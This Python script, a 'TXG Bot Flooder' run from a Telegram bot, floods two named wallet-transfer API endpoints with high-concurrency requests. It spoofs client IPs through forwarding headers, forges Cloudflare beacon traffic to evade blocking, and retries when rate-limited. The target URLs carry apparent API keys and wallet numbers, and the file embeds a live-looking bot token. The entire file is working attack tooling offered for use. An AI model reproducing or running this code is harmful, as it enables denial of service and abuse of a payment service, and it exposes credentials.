#!/usr/bin/env python3
"""
🔥 TXG BOT FLOODER – Full Telegram Control + IP Bypass + Railway Ready
"""

import asyncio
import aiohttp
import time
import os
import signal
import sys
import logging
import random
import string
from urllib.parse import urlparse
from aiohttp import web

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8802900336:AAH-kjC7LYFHu60nAkKfSCZqc28AiRrB89M"
ADMIN_ID = 8401097557

# ─── TARGET CONFIG ──────────────────────────────────────
TARGET_APIS = [
    "https://rupixwallet.shop/api/v1/wallet/transfer?key=RUPIX-L01QE878&wallet=6283146815&amount=1&comment={comment}",
    "https://rupixwallet.shop/api/v1/wallet/transfer?key=RUPIX-QB65RQZ1&wallet=9359202967&amount=1&comment={comment}"
]

BEACON_URL = "https://performance.radar.cloudflare.com/api/beacon"

# ─── FLOODER CONFIG ──────────────────────────────────────
BATCH_SIZE = 100
CONCURRENT_LIMIT = 200
REQUEST_DELAY = 0.1
MAX_RETRIES = 3
MAX_USAGE_PER_IP = 7
TIMEOUT = 15

# ─── SHARED STATE ─────────────────────────────────────────
flooder_running = False
flooder_task = None
ip_pool = {}
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0, 'retries': 0}
stats_lock = asyncio.Lock()
ip_lock = asyncio.Lock()
start_time = 0

# ─── HELPERS ──────────────────────────────────────────────
def random_ip():
    """Generate random IP address"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_spoof_ip():
    """Pick an IP from pool (if any) else random."""
    if ip_pool:
        return random.choice(list(ip_pool.keys()))
    return random_ip()

def random_comment(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_url(base_url):
    return base_url.format(comment=random_comment())

def generate_token():
    """Generate X-Submit-Token for Cloudflare"""
    timestamp = int(time.time() * 1000)
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    return f"{timestamp}-{random_str}"

def get_android_user_agents():
    """List of Android browser user agents"""
    return [
        "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36"
    ]

def get_beacon_payload():
    """Generate Cloudflare beacon payload"""
    timestamp = int(time.time() * 1000)
    return {
        "sessionTimeMs": timestamp,
        "triggerCode": 1015,
        "measurements": [
            {
                "targetEntity": "cdn-cloudflare-ps",
                "preWarmedRequest": False,
                "transferSize": 130398,
                "failure": False,
                "targetObjectHash": "27bce9e85eaf3567a4695ba2b612e32615394d80d0a3a2dcb07b1fbfdfababc7",
                "instanceTimeMs": timestamp - 1000,
                "domainLookupStart": random.uniform(100, 200),
                "domainLookupEnd": random.uniform(100, 200),
                "connectStart": random.uniform(100, 200),
                "connectEnd": random.uniform(200, 300),
                "connectSecureStart": random.uniform(150, 250),
                "responseStart": random.uniform(300, 400),
                "requestStart": random.uniform(200, 300),
                "responseEnd": random.uniform(400, 500),
                "encodedBodySize": 102400,
                "decodedBodySize": 102400,
                "connectProtocol": "http/2"
            }
        ]
    }

# ─── CLOUDFLARE BEACON ──────────────────────────────────
async def send_beacon(session, spoof_ip, origin):
    """Send Cloudflare beacon with correct origin and IP"""
    try:
        # OPTIONS pre-flight
        options_headers = {
            "accept": "*/*",
            "access-control-request-method": "POST",
            "access-control-request-headers": "access-control-allow-origin,content-type,x-submit-token",
            "origin": origin,
            "user-agent": random.choice(get_android_user_agents()),
            "sec-fetch-mode": "cors",
            "x-requested-with": "XMLHttpRequest",
            "sec-fetch-site": "cross-site",
            "sec-fetch-dest": "empty",
            "X-Forwarded-For": spoof_ip,
            "X-Real-IP": spoof_ip,
        }
        async with session.options(BEACON_URL, headers=options_headers) as resp:
            pass

        # POST beacon
        token = generate_token()
        payload = get_beacon_payload()
        post_headers = {
            "host": "performance.radar.cloudflare.com",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": random.choice(get_android_user_agents()),
            "x-submit-token": token,
            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
            "content-type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": origin,
            "x-requested-with": "XMLHttpRequest",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "priority": "u=1, i",
            "X-Forwarded-For": spoof_ip,
            "X-Real-IP": spoof_ip,
        }
        async with session.post(BEACON_URL, headers=post_headers, json=payload, timeout=10) as resp:
            return resp.status == 200
    except Exception as e:
        return False

# ─── REQUEST WORKER ────────────────────────────────────────
async def send_request(session, url, retry_count=0):
    """Send request with IP spoofing and retry logic"""
    async with ip_lock:
        spoof_ip = get_spoof_ip()
    
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    
    # Send beacon
    await send_beacon(session, spoof_ip, origin)
    
    # Build headers with spoofed IPs
    headers = {
        "host": parsed.netloc,
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "upgrade-insecure-requests": "1",
        "user-agent": random.choice(get_android_user_agents()),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "dnt": "1",
        "x-requested-with": "XMLHttpRequest",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "cookie": f"PHPSESSID={''.join(random.choices(string.hexdigits, k=32))}",
        "priority": "u=0, i",
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "Forwarded": f"for={spoof_ip};proto=https",
        "Client-IP": spoof_ip,
        "X-Proxy-IP": spoof_ip,
        "True-Client-IP": spoof_ip,
    }
    
    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=10)
    
    try:
        async with session.get(url, headers=headers, ssl=True, timeout=timeout) as resp:
            status = resp.status
            
            async with stats_lock:
                stats['sent'] += 1
            
            if 200 <= status < 400:
                # Success: add/update IP in pool
                async with ip_lock:
                    if spoof_ip in ip_pool:
                        ip_pool[spoof_ip] += 1
                        if ip_pool[spoof_ip] >= MAX_USAGE_PER_IP:
                            del ip_pool[spoof_ip]
                    else:
                        ip_pool[spoof_ip] = 1
                
                async with stats_lock:
                    stats['ok'] += 1
                logger.debug(f"✅ OK [{spoof_ip}] → {status}")
                return True
            
            elif status in (403, 429, 503, 500):
                # Blocked - retry
                if retry_count < MAX_RETRIES:
                    async with stats_lock:
                        stats['retries'] += 1
                    await asyncio.sleep(2 ** retry_count)
                    return await send_request(session, url, retry_count + 1)
                else:
                    async with ip_lock:
                        if spoof_ip in ip_pool:
                            del ip_pool[spoof_ip]
                    async with stats_lock:
                        stats['fail'] += 1
                        stats['blocked'] += 1
                    logger.debug(f"❌ BLOCKED [{spoof_ip}] → {status}")
                    return False
            else:
                # Other errors - retry
                if retry_count < MAX_RETRIES:
                    async with stats_lock:
                        stats['retries'] += 1
                    await asyncio.sleep(2 ** retry_count)
                    return await send_request(session, url, retry_count + 1)
                else:
                    async with ip_lock:
                        if spoof_ip in ip_pool:
                            del ip_pool[spoof_ip]
                    async with stats_lock:
                        stats['fail'] += 1
                    logger.debug(f"❌ FAIL [{spoof_ip}] → {status}")
                    return False
    
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        # Connection error - retry
        if retry_count < MAX_RETRIES:
            async with stats_lock:
                stats['retries'] += 1
            await asyncio.sleep(2 ** retry_count)
            return await send_request(session, url, retry_count + 1)
        else:
            async with ip_lock:
                if spoof_ip in ip_pool:
                    del ip_pool[spoof_ip]
            async with stats_lock:
                stats['sent'] += 1
                stats['fail'] += 1
            logger.debug(f"⚠️ ERROR [{spoof_ip}] → {str(e)[:50]}")
            return False
    
    except Exception as e:
        async with ip_lock:
            if spoof_ip in ip_pool:
                del ip_pool[spoof_ip]
        async with stats_lock:
            stats['sent'] += 1
            stats['fail'] += 1
        logger.debug(f"⚠️ EXCEPTION [{spoof_ip}] → {str(e)[:50]}")
        return False

# ─── MAIN FLOODER LOOP ─────────────────────────────────────
async def flooder_loop():
    global flooder_running
    logger.info("🔥 Flooder started (infinite)")

    connector = aiohttp.TCPConnector(
        limit=CONCURRENT_LIMIT,
        limit_per_host=CONCURRENT_LIMIT,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        ssl=False
    )
    
    sem = asyncio.Semaphore(CONCURRENT_LIMIT)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while flooder_running:
            tasks = []
            
            for _ in range(BATCH_SIZE):
                if not flooder_running:
                    break
                base = random.choice(TARGET_APIS)
                url = build_url(base)
                task = asyncio.create_task(send_request(session, url))
                tasks.append(task)
                await asyncio.sleep(REQUEST_DELAY)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            if flooder_running:
                await asyncio.sleep(REQUEST_DELAY)
        
        logger.info("Flooder stopped.")

# ─── TELEGRAM BOT COMMANDS ────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    keyboard = [
        ["⚡ Start Flood", "🛑 Stop Flood"],
        ["📊 Status", "⚙️ Settings"],
        ["📦 Batch Size", "⏱️ Timeout"]
    ]
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ Start Flood", callback_data="startflood")],
        [InlineKeyboardButton("🛑 Stop Flood", callback_data="stopflood")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ])
    
    msg = (
        "🔥 **TXG Bot Flooder**\n"
        "🛡️ IP Spoofing + Cloudflare Bypass\n"
        "📌 Railway Ready\n\n"
        "Use /commands or buttons below:"
    )
    await update.message.reply_text(msg, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("⛔ Unauthorized.")
        return
    
    action = query.data
    
    if action == "startflood":
        await start_flooder(update, context, query)
    elif action == "stopflood":
        await stop_flooder(update, context, query)
    elif action == "status":
        await show_status(update, context, query)
    elif action == "settings":
        await show_settings(update, context, query)

async def start_flooder(update, context, query=None):
    global flooder_running, flooder_task, start_time, stats
    if flooder_running:
        msg = "⚠️ Flooder already running."
        if query:
            await query.edit_message_text(msg)
        else:
            await update.message.reply_text(msg)
        return
    
    flooder_running = True
    start_time = time.time()
    async with stats_lock:
        stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0, 'retries': 0}
    flooder_task = asyncio.create_task(flooder_loop())
    
    msg = "▶️ Flooder started successfully!"
    if query:
        await query.edit_message_text(msg)
    else:
        await update.message.reply_text(msg)

async def stop_flooder(update, context, query=None):
    global flooder_running
    if not flooder_running:
        msg = "⚠️ Flooder already stopped."
        if query:
            await query.edit_message_text(msg)
        else:
            await update.message.reply_text(msg)
        return
    
    flooder_running = False
    if flooder_task:
        flooder_task.cancel()
    
    msg = "🛑 Flooder stopped."
    if query:
        await query.edit_message_text(msg)
    else:
        await update.message.reply_text(msg)

async def show_status(update, context, query=None):
    elapsed = time.time() - start_time if start_time else 0
    async with stats_lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
        b = stats['blocked']
        r = stats['retries']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    
    async with ip_lock:
        pool_size = len(ip_pool)
    
    msg = (
        f"📊 **Live Stats**\n"
        f"📤 Sent: {s:,}\n"
        f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
        f"❌ Errors: {f:,}\n"
        f"🚫 Blocked: {b:,}\n"
        f"🔄 Retries: {r:,}\n"
        f"⚡ Rate: {rate:.1f} req/s\n"
        f"🌐 IP Pool: {pool_size}\n"
        f"🕒 Uptime: {int(elapsed)}s\n"
        f"🔄 Running: {'✅ Yes' if flooder_running else '❌ No'}"
    )
    
    if query:
        await query.edit_message_text(msg)
    else:
        await update.message.reply_text(msg)

async def show_settings(update, context, query=None):
    msg = (
        f"⚙️ **Current Settings**\n\n"
        f"📦 Batch Size: {BATCH_SIZE}\n"
        f"⏱️ Timeout: {TIMEOUT}s\n"
        f"⚡ Concurrent Limit: {CONCURRENT_LIMIT}\n"
        f"🔄 Max IP Usage: {MAX_USAGE_PER_IP}\n"
        f"🔄 Retries: {MAX_RETRIES}\n"
        f"⏳ Request Delay: {REQUEST_DELAY}s\n"
        f"🎯 Targets: {len(TARGET_APIS)}\n\n"
        f"Use commands to change settings:\n"
        f"/setbatch <size>\n"
        f"/settimeout <seconds>\n"
        f"/setdelay <seconds>\n"
        f"/setips <max_usage>\n"
        f"/setretry <count>"
    )
    
    if query:
        await query.edit_message_text(msg)
    else:
        await update.message.reply_text(msg)

# ─── SETTINGS COMMANDS ─────────────────────────────────────
async def set_batch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BATCH_SIZE
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        BATCH_SIZE = val
        await update.message.reply_text(f"✅ Batch size set to {val}")
    except:
        await update.message.reply_text("❌ Usage: /setbatch <number>")

async def set_timeout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TIMEOUT
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        TIMEOUT = val
        await update.message.reply_text(f"✅ Timeout set to {val}s")
    except:
        await update.message.reply_text("❌ Usage: /settimeout <seconds>")

async def set_delay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REQUEST_DELAY
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = float(context.args[0])
        if val < 0:
            raise ValueError
        REQUEST_DELAY = val
        await update.message.reply_text(f"✅ Request delay set to {val}s")
    except:
        await update.message.reply_text("❌ Usage: /setdelay <seconds>")

async def set_ips_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAX_USAGE_PER_IP
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 1:
            raise ValueError
        MAX_USAGE_PER_IP = val
        await update.message.reply_text(f"✅ Max IP usage set to {val}")
    except:
        await update.message.reply_text("❌ Usage: /setips <number>")

async def set_retry_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAX_RETRIES
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(context.args[0])
        if val < 0:
            raise ValueError
        MAX_RETRIES = val
        await update.message.reply_text(f"✅ Max retries set to {val}")
    except:
        await update.message.reply_text("❌ Usage: /setretry <number>")

# ─── AUTO REPORT ────────────────────────────────────────────
async def auto_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    async with stats_lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
        b = stats['blocked']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    
    async with ip_lock:
        pool_size = len(ip_pool)
    
    msg = (
        f"📊 **Auto Report**\n"
        f"📤 Sent: {s:,}\n"
        f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
        f"❌ Errors: {f:,}\n"
        f"🚫 Blocked: {b:,}\n"
        f"⚡ Rate: {rate:.1f} req/s\n"
        f"🌐 IPs: {pool_size}\n"
        f"🕒 Uptime: {int(elapsed)}s"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── HEALTH CHECK WEB SERVER ──────────────────────────────
async def health(request):
    return web.Response(text="✅ TXG Bot Flooder Online | IP Spoofing + CF Bypass", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    logger.info("🌐 Web server started on port %s", port)
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    # Start Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", show_status))
    app.add_handler(CommandHandler("startflood", start_flooder))
    app.add_handler(CommandHandler("stopflood", stop_flooder))
    app.add_handler(CommandHandler("settings", show_settings))
    app.add_handler(CommandHandler("setbatch", set_batch_cmd))
    app.add_handler(CommandHandler("settimeout", set_timeout_cmd))
    app.add_handler(CommandHandler("setdelay", set_delay_cmd))
    app.add_handler(CommandHandler("setips", set_ips_cmd))
    app.add_handler(CommandHandler("setretry", set_retry_cmd))
    
    # Callback query handler for buttons
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Auto-report every 30 seconds
    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(auto_report, interval=30, first=10)
    
    # Notify admin
    try:
        await app.bot.send_message(
            chat_id=ADMIN_ID,
            text="🔥 **TXG Bot Flooder Online**\n"
                 "🛡️ IP Spoofing + Cloudflare Bypass\n"
                 "📌 Railway Ready\n\n"
                 "/start for commands"
        )
    except Exception as e:
        logger.error(f"Failed to send startup message: {e}")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    # Run web server alongside
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        logger.info("🛑 Shutting down...")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
